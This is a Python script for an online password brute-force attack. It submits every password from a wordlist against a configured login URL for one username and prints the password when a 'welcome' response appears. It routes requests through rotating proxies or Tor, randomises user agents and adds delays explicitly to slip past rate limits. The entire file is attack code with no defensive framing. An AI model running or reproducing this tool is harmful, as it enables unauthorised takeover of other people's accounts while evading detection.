import asyncio
import random
import time
from config import *
from lib.captcha import solve_captcha
from lib.proxy_manager import ProxyManager
from lib.logger import Logger
from lib.tor_manager import TorSessionManager
from lib.utils import load_passwords
import aiohttp

logger = Logger(LOG_FILE)
proxy_manager = ProxyManager(PROXY_LIST)

# Tor session manager setup (if enabled)
tor_manager = TorSessionManager() if TOR_ENABLED else None

async def attempt_login(username, password, proxy=None):
    # Determine whether to use Tor or a proxy
    session = tor_manager.get_tor_session() if tor_manager else aiohttp.ClientSession()
    if proxy and not tor_manager:
        session.proxy = proxy

    # Prepare login data
    login_data = {"username": username, "password": password}
    headers = {"User-Agent": random.choice(USER_AGENTS), "Referer": TARGET_URL}

    try:
        async with session.post(TARGET_URL, data=login_data, headers=headers) as response:
            text = await response.text()
            if "incorrect password" in text.lower():
                logger.log_attempt(username, password, success=False)
            elif "welcome" in text.lower():
                logger.log_attempt(username, password, success=True)
                print("Password found:", password)
                return True
    except Exception as e:
        logger.log_attempt(username, password, success=False, error=str(e))
    finally:
        await session.close()
    return False

async def main():
    passwords = load_passwords(PASSWORD_FILE)
    tasks = []
    for password in passwords:
        proxy = proxy_manager.get_proxy() if not TOR_ENABLED else None
        tasks.append(attempt_login(USERNAME, password, proxy))
        await asyncio.sleep(random.uniform(*DELAY_RANGE))  # Delay to avoid rate limits
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
